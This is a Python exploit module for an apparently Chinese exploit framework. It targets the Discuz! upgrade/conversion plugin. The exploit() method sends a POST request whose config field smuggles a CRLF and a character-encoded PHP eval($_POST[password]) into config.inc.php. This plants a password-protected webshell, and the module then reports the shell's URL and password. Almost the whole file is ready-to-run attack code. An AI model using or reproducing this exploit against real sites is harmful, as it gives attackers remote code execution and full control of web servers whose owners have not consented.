#coding: utf-8

import os
import sys
import datetime
import re
from exp_template import Exploit, Level, session, get_random_password

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""


class discuz_utility_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'discuz_utility_getshell',
            'author': 'x',
            'date': '2018-02-28',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'discuz',
            'min_version': '',
            'max_version': '',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Discuz! 升级/转换工具是一款 Discuz! 上常用的插件。该插件存在设计缺陷，导致黑客可以构造特殊的请求，在网站上生成 webshell 以获得网站的管理权限。',
            'reference':'Discuz! X Getshell漏洞分析.docx',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        randpass = get_random_password()
        realpass = ''
        for x in randpass:
            realpass += 'Chr(%d).' % ord(x)
    	key={
            'a':'config',
            'source':'d7.2_x2.0',
            'submit':'yes',
            'newconfig[target][dbhost]':'localhost',
            "newconfig[aaa\r\neval(Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91)."+realpass+"Chr(93).Chr(41).Chr(59));//]":'localhost',
            'newconfig[source][dbuser]':'root',
            'newconfig[source][dbpw]':'',
            'newconfig[source][dbname]':'discuz',
            'newconfig[source][tablepre]':'cdb_',
            'newconfig[source][dbcharset]':'',
            'newconfig[source][pconnect]':'1',
            'newconfig[target][dbhost]':'localhost',
            'newconfig[target][dbuser]':'root',
            'newconfig[target][dbpw]':'',
            'newconfig[target][dbname]':'discuzx',
            'newconfig[target][tablepre]':'pre_',
            'newconfig[target][dbcharset]':'',
            'newconfig[target][pconnect]':'1',
            'submit':'yes'
            }
        url=self.url+"/utility/convert/index.php?a=config&source=ss7.5_x2.0"
        try:
            req = session()
            r=req.post(url=url, data=key)
        except:
            self.report('目标连接失败', Level.error)
            return
        print self.url+'/utility/convert/data/config.inc.php', randpass, 'php'
        self.shell_info(self.url+'/utility/convert/data/config.inc.php', randpass, 'php')


if __name__ == "__main__":
    # url = "http://192.168.40.26:81/upload/forum.php"
    # a = discuz_utility_getshell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = discuz_utility_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__

